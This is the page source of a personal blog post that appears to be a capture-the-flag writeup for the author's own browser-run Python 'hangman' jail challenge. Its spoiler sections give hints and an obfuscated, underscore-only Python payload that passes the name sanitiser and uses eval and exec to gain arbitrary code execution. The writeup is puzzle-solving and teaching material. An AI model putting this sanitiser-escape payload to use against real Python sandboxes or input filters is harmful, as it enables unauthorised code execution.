
import Layout from '@/components/layout'
import Head from 'next/head'
import Accordion from '@/components/accordion'
import Sidebar from '@/components/sidebar'
import Link from 'next/link'
import ProminentLink from '@/components/prominentLink'
import DiscreetLink from '@/components/discreetLink'
import MailLink from '@/components/mailLink'

import { FaChevronRight, FaSearch, FaBook } from 'react-icons/fa'
import { RiArrowGoBackFill } from 'react-icons/ri'

import 'katex/dist/katex.min.css'
import Latex from 'react-latex-next'
import Spoiler from '@/components/spoiler'
import IncompleteMessage from '@/components/incompleteMessage'
import Image from 'next/image'
import { copyToClipboard, CopyButton } from '@/components/copyButton'
import { ToastContainer } from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css'


export default function Terminal () {
    return (
        <Layout>
            <Head>
                <title>Terminal | Daniel C</title>
            </Head>
                <>
                    
                        <ToastContainer
                            position='top-right'
                            autoClose={5000}
                            hideProgressBar={false}
                            newestOnTop={false}
                            closeOnClick
                            rtl={false}
                            pauseOnFocusLoss={false}
                            pauseOnHover={false}
                            theme='dark'
                        />
    
                    <div className="relative w-full 2xl:max-w-[90%] flex h-full"> {/* whole thing (including large-screen left space filler, which is 10%) is max 90%; so 10% each side */}
    <Sidebar>

        <ul className="dirtree px-4 pt-1 border-elevated scrollbar-thin scrollbar-thumb-elevated scrollbar-track-body overflow-y-scroll w-full md:w-[calc(300px-2px)] h-full md:h-auto md:max-h-[calc(100vh-15rem)] break-all">
            <li className="relative bottom-0 pl-4">
                <div className="text-primary mb-0.5">
                    <Link href="/" className="flex items-center space-x-1.5 max-w-fit">
                        <FaBook/>
                        <span>root</span>
                    </Link>
                </div>
                <ul className="mb-4 md:mb-0">
                    
                        
                            <Accordion title="comp-sci" href="/comp-sci" isFolder={true} isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                        
                            <Accordion title="algorithms" href="/comp-sci/algorithms" isFolder={true} isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                        
                            <Accordion title="binary-search" href="/comp-sci/algorithms/binary-search" isFolder={false} isSelected={ false } />
                        
                    
                                
                            </Accordion>
                        
                    
                        
                            <Accordion title="web-dev" href="/comp-sci/web-dev" isFolder={true} isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                        
                            <Accordion title="story-of-the-site" href="/comp-sci/web-dev/story-of-the-site" isFolder={false} isSelected={ false } />
                        
                    
                                
                            </Accordion>
                        
                    
                                
                            </Accordion>
                        
                    
                        
                            <Accordion title="maths" href="/maths" isFolder={true} isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                        
                            <Accordion title="number-theory" href="/maths/number-theory" isFolder={true} isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                        
                            <Accordion title="FTA-proof" href="/maths/number-theory/FTA-proof" isFolder={true} isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                        
                            <Accordion title="1-integer-axioms" href="/maths/number-theory/FTA-proof/1-integer-axioms" isFolder={false} isSelected={ false } />
                        
                    
                        
                            <Accordion title="2-division-algo" href="/maths/number-theory/FTA-proof/2-division-algo" isFolder={false} isSelected={ false } />
                        
                    
                        
                            <Accordion title="3-bezout-egcd" href="/maths/number-theory/FTA-proof/3-bezout-egcd" isFolder={false} isSelected={ false } />
                        
                    
                        
                            <Accordion title="4-euclid" href="/maths/number-theory/FTA-proof/4-euclid" isFolder={false} isSelected={ false } />
                        
                    
                        
                            <Accordion title="5-fta" href="/maths/number-theory/FTA-proof/5-fta" isFolder={false} isSelected={ false } />
                        
                    
                                
                            </Accordion>
                        
                    
                                
                            </Accordion>
                        
                    
                        
                            <Accordion title="olympiad" href="/maths/olympiad" isFolder={true} isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                        
                            <Accordion title="techniques" href="/maths/olympiad/techniques" isFolder={true} isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                        
                            <Accordion title="lagrange-multipliers" href="/maths/olympiad/techniques/lagrange-multipliers" isFolder={false} isSelected={ false } />
                        
                    
                                
                            </Accordion>
                        
                    
                                
                            </Accordion>
                        
                    
                        
                            <Accordion title="research" href="/maths/research" isFolder={true} isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                        
                            <Accordion title="CNATs" href="/maths/research/CNATs" isFolder={false} isSelected={ false } />
                        
                    
                        
                            <Accordion title="cube-tilings" href="/maths/research/cube-tilings" isFolder={false} isSelected={ false } />
                        
                    
                                
                            </Accordion>
                        
                    
                                
                            </Accordion>
                        
                    
                        
                            <Accordion title="writeups" href="/writeups" isFolder={true} isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                        
                            <Accordion title="terminal" href="/writeups/terminal" isFolder={false} isSelected={ true } />
                        
                    
                                
                            </Accordion>
                        
                    
                </ul>
            </li>
        </ul>

    </Sidebar>

    <article className="w-full min-w-0 px-6 pt-3 mb-14">

        <div className="h-[4.5rem] md:h-0"/>

        
            <div className="flex flex-wrap items-center align-middle space-x-1 mb-3">
                
                    <span className="relative top-[0.1em] text-elevated"> <FaChevronRight size={12}/> </span>
                    <p className="text-lg font-bold text-secondary [@media(hover:hover)]:hover:underline"><Link href="/writeups">writeups</Link></p>
                
            </div>
        

        
            <p className="text-elevated mb-4">Last modified on 08 Jun 2024</p>
        

        
            <div className="mb-4">
                <CopyButton text="A writeup for the hangman challenge on my homepage. Hint 1 The hangman game really is unbeatable. The goal of the challenge is to take advantage of the name loading and use that to read the flag. Hint 2 Look at the name verification function. If we can write some python code that sanitizes to ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran game.py. So the goal is: write a python file that reads /flag.txt, whose alphanumeric characters in order are Erroryour.... Hint 3 Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful. We can have variables because underscores are allowed in python variable names. Also we have numbers, by doing something like: _ = &#x27;&#x27; &lt; &#x27;_&#x27; # one (compares ascii values) __ = _+_+_+_ # four ___ = __*__ # sixteen Solution What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative? For readability, I&#x27;ve named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a trick of encoding a utf-8 string in utf-16 to garble it. &#x27;Erroryo&#x27; U,R,N = &#x27;urn&#x27; &#x27;amedoesn&#x27; T,S = &#x27;ts&#x27; &#x27;eemtob&#x27; EVAL = eval STR = EVAL(S+T+R) I,D = &#x27;id&#x27; DIR = EVAL(D+I+R) &#x27;IllcallyouMrUn&#x27; ONE = &#x27;&#x27;&lt;&#x27;_&#x27; SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S FUNCS = DIR(EVAL(&#x27;__import__(&quot;&#x27;+BUILTINS+&#x27;&quot;)&#x27;)) &#x27;ant&#x27; EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE] BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE] # the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is: # while True: exec(input()); SHELLCODE = BYTES+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+U+STR(SEVEN+SEVEN+ONE+ONE)+&#x27;&quot;)[&#x27;+STR(ONE+ONE)+&#x27;:]&#x27; EVAL(EXEC+&#x27;(&#x27;+SHELLCODE+&#x27;)&#x27;) And the reduced version: &#x27;Erroryo&#x27;;________,_____,_________=&#x27;urn&#x27;;&#x27;amedoesn&#x27;;__________,______=&#x27;ts&#x27;;&#x27;eemtob&#x27;;___=eval;____,___________=&#x27;id&#x27;;&#x27;IllcallyouMrUn&#x27;;_=&#x27;&#x27;&lt;&#x27;_&#x27;;__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___(&#x27;__import__(&quot;&#x27;+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+&#x27;&quot;)&#x27;)))[-__*__-_-_]+&#x27;(&#x27;+____________[-__*__-__-__-_-_]+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+________+_______(__+__+_+_)+&#x27;&quot;)[&#x27;+_______(_+_)+&#x27;:]&#x27;+&#x27;)&#x27;);&#x27;ant&#x27; Cheese solution The way I got python to run in the browser was with pyodide and a web-worker. So the python runs client-side (!) i.e. this is all really a fake prison-break environment. In particular the flag file has to be generated somehow, so the flag is somewhere in the source. So I had to find somewhere to hide the loading of the flag so that it wasn&#x27;t completely obvious. It&#x27;s in the main thread so at least there are no revealing network requests (initially it was in init.py). It&#x27;s base-64 encoded; look for it in F12 -&gt; Sources.">Copy article plaintext</CopyButton>
            </div>
        

        <div className="article mb-4">
            <h1 id="terminal-challenge">Terminal Challenge</h1>

<p>A writeup for the <DiscreetLink href='https://terminal.danielc.rocks'>hangman</DiscreetLink> challenge on my homepage.</p>

<h2 id="hint-1" className="group flex">Hint 1&nbsp;<Link href="#hint-1" onClick={() => copyToClipboard("https://blog.danielc.rocks/writeups/terminal#hint-1", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>The hangman game really is <ProminentLink href='https://youtu.be/le5uGqHKll8?t=550'>unbeatable</ProminentLink>. The goal of the challenge is to take advantage of the name loading and use that to read the flag.</p>

</Spoiler>

<h2 id="hint-2" className="group flex">Hint 2&nbsp;<Link href="#hint-2" onClick={() => copyToClipboard("https://blog.danielc.rocks/writeups/terminal#hint-2", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>Look at the name verification function. If we can write some python code that sanitizes to <code>ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant</code>, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran <code>game.py</code>.</p>

<p><br/>
So the goal is: write a python file that reads <code>/flag.txt</code>, whose alphanumeric characters in order are <code>Erroryour...</code>.</p>

</Spoiler>

<h2 id="hint-3" className="group flex">Hint 3&nbsp;<Link href="#hint-3" onClick={() => copyToClipboard("https://blog.danielc.rocks/writeups/terminal#hint-3", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful.</p>

<p><br/></p>

<p>We can have variables because underscores are allowed in python variable names.
Also we have numbers, by doing something like:</p>

<pre><code>_ = '' &lt; '_' # one (compares ascii values)<br/>__ = _+_+_+_ # four<br/>___ = __*__ # sixteen<br/></code></pre>

</Spoiler>

<h2 id="solution" className="group flex">Solution&nbsp;<Link href="#solution" onClick={() => copyToClipboard("https://blog.danielc.rocks/writeups/terminal#solution", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative?</p>

<p><br/></p>

<p>For readability, I've named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a <ProminentLink href='https://github.com/clemg/pythongolfer?tab=readme-ov-file#3---qa'>trick</ProminentLink> of encoding a utf-8 string in utf-16 to garble it.</p>

<pre><code>'Erroryo'<br/>U,R,N = 'urn'<br/>'amedoesn'<br/>T,S = 'ts'<br/>'eemtob'<br/>EVAL = eval<br/>STR = EVAL(S+T+R)<br/>I,D = 'id'<br/>DIR = EVAL(D+I+R)<br/>'IllcallyouMrUn'<br/>ONE = ''&lt;'_'<br/>SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE<br/>BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S<br/>FUNCS = DIR(EVAL('__import__("'+BUILTINS+'")'))<br/>'ant'<br/><br/>EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE]<br/>BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE]<br/><br/># the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is:<br/># while True: exec(input());<br/><br/>SHELLCODE = BYTES+'("桷汩⁥牔敵›硥捥椨灮瑵⤨㬩","'+U+STR(SEVEN+SEVEN+ONE+ONE)+'")['+STR(ONE+ONE)+':]'<br/><br/>EVAL(EXEC+'('+SHELLCODE+')')<br/></code></pre>

<p><br/></p>

<div className='inline'>
And the reduced version:
</div>

<pre className="relative">
<div className="absolute top-2 right-2"><CopyButton text="'Erroryo';________,_____,_________='urn';'amedoesn';__________,______='ts';'eemtob';___=eval;____,___________='id';'IllcallyouMrUn';_=''&lt;'_';__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___('__import__(&quot;'+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+'&quot;)')))[-__*__-_-_]+'('+____________[-__*__-__-__-_-_]+'(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;'+________+_______(__+__+_+_)+'&quot;)['+_______(_+_)+':]'+')');'ant'"/></div>
<code>'Erroryo';________,_____,_________='urn';'amedoesn';__________,______='ts';'eemtob';___=eval;____,___________='id';'IllcallyouMrUn';_=''&lt;'_';__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___('__import__("'+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+'")')))[-__*__-_-_]+'('+____________[-__*__-__-__-_-_]+'("桷汩⁥牔敵›硥捥椨灮瑵⤨㬩","'+________+_______(__+__+_+_)+'")['+_______(_+_)+':]'+')');'ant'<br/></code></pre>

</Spoiler>

<h2 id="cheese-solution" className="group flex">Cheese solution&nbsp;<Link href="#cheese-solution" onClick={() => copyToClipboard("https://blog.danielc.rocks/writeups/terminal#cheese-solution", true)} className="hidden group-hover:block text-primary">¶</Link></h2>

<Spoiler>

<p>The way I got python to run in the browser was with <DiscreetLink href='https://pyodide.org/en/stable/'>pyodide</DiscreetLink> and a <DiscreetLink href='https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers'>web-worker</DiscreetLink>.
So the python runs client-side (!) i.e. this is all really a fake prison-break environment. In particular the flag file has to be generated somehow, so the flag is somewhere in the source.</p>

<p><br/></p>

<p>So I had to find somewhere to hide the loading of the flag so that it wasn't completely obvious. It's in the main thread so at least there are no revealing network requests (initially it was in <code>init.py</code>).</p>

<p><br/></p>

<p>It's base-64 encoded; look for it in F12 -&gt; Sources.</p>

</Spoiler>

        </div>

        
            <div className="flex justify-start mb-4">
                <Link href="/writeups">
                    <div className="flex items-center justify-center space-x-1 text-primary">
                        <RiArrowGoBackFill/>
                        <p>up a level</p>
                    </div>
                </Link>
            </div>
        

    </article>

    
        <nav className="hidden xl:flex w-[300px] xl:shrink-0 xl:justify-start h-100% min-h-screen border-l-2 border-elevated px-6 py-4">
            <div className="fixed">
                <h1 className="font-bold text-xl">In this Article</h1>
                <ul className="text-elevated">
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#hint-1" className="text-link [@media(hover:hover)]:hover:underline">Hint 1</Link></li>
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#hint-2" className="text-link [@media(hover:hover)]:hover:underline">Hint 2</Link></li>
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#hint-3" className="text-link [@media(hover:hover)]:hover:underline">Hint 3</Link></li>
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#solution" className="text-link [@media(hover:hover)]:hover:underline">Solution</Link></li>
                    
                        <li className="pt-2 text-lg font-bold flex items-start justify-start space-x-1"><FaChevronRight className="relative top-2" size={12}/><Link href="#cheese-solution" className="text-link [@media(hover:hover)]:hover:underline">Cheese solution</Link></li>
                    
                </ul>
            </div>
        </nav>
    
</div>
                </>
        </Layout>
    )
}
    